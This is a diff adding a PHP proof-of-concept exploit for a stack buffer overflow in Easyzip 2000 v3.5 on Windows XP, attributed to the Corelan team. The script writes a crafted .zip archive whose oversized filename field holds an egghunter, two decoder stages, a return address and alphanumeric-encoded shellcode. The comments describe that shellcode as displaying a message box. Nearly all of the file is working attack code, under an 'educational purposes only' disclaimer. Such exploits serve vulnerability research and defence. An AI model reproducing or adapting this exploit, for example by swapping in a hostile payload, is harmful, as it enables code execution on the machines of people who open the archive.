@@ -1,0 +1,66 @@
+<?php
+/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Easyzip 2000 v3.5 (.zip) 0day stack buffer overflow PoC exploit
+Author: mr_me - http://net-ninja.net/
+Download: http://www.thefreesite.com/ezip35.exe
+Platform: Windows XP sp3
+Advisory: http://www.corelan.be:8800/advisories.php?id=10-032
+Greetz to: Corelan Security Team
+http://www.corelan.be:8800/index.php/security/corelan-team-members/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Script provided 'as is', without any warranty.
+Use for educational purposes only.
+Do not use this code to do anything illegal !
+ 
+Note : you are not allowed to edit/modify this code.
+If you do, Corelan cannot be held responsible for any damages this may cause.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ascii lowercase and payload space < 400 bytes, yet we still get code execution.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+*/
+ 
+// local file header
+$lf_header = "\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00";
+ 
+// central directory file header
+$cdf_header = "\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00".
+"\x24\x00\x00\x00\x00\x00\x00\x00";
+ 
+// end of central directory record
+$efcdr_record = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
+"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00";
+
+// filename
+$_____name = "\x6D\x72\x5F\x6D\x65\x73\x5F\x73\x65\x63\x72\x65\x63\x74".
+"\x5F\x70\x61\x73\x73\x77\x6F\x72\x64\x73\x2E\x74\x78\x74";
+ 
+// corelan security team msgbox
+$_____sc = "VTX10X41PZ41H4A4K1TG91TGFVTZ32PZNBFZDWE02DWF0D71DJEON4F1W9M490R0P08654E2".
+"M9Y2F64346K5K450115MN2G0N0B0L5C5DKO106737KO9W8P0O2L1L0P184E3U0Q8P1G3L5O9R601E671O9W".
+"343QOO113RJOLK8M640M1K3WOL1W4Y2O613V2I4K5C0R0S0PMO2O3W2O8K9R1Z1K0S1H3PLMKM5KKK8M0S4".
+"JJL15612J1267KM2K4D903K03";
+
+// lowercase ascii encoded egghunter
+$eh = "j314d34djq34djk34d1431s11s7j314d34dj234dkms502ds5o0d35upj51g4241n20b0d5".
+"225737445m51c5k5dk4j49b591e7b5k4k385bk2j55bk59359927";
+ 
+$decoderStage1 = "\x25\x4a\x4d\x4e\x55\x25\x35\x08\x31\x2a".
+"\x2d\x49\x49\x49\x5e\x2d\x4a\x49\x4a\x5e\x2d\xc1\xc1\xc1\x5f";
+
+$decoderStage2 = "\x25\x4A\x4d\x4e\x55\x25\x10\x10\x31\x10".
+"\x2d\x2a\x69\x37\xc1\x2d\x2a\x69\x36\xc1\x2d\x2b\x6a\xb1\x9b";
+
+$align = "\x60".str_repeat("\x5d",7);
+
+$___exploit = $_____name.str_repeat("\x61",249).$eh.str_repeat("\x61",144-strlen($eh))."\x60".
+str_repeat("\x5b",8).$decoderStage1.$align.$decoderStage2.$align."\x98\x8e\x89\xf1\x64\x64".
+"\x16\x32\x40\x00";
+$___exploit .= str_repeat("\x61",2000-strlen($___exploit))."\x57\x30\x30\x54\x57\x30\x30\x54".$_____sc.
+str_repeat("\x61",2056-strlen($_____sc))."\x2e\x74\x78\x74";
+            
+$_____b00m = $lf_header.$___exploit.$cdf_header.$___exploit.$efcdr_record;
+file_put_contents("cst-easyzip.zip",$_____b00m);
+?>
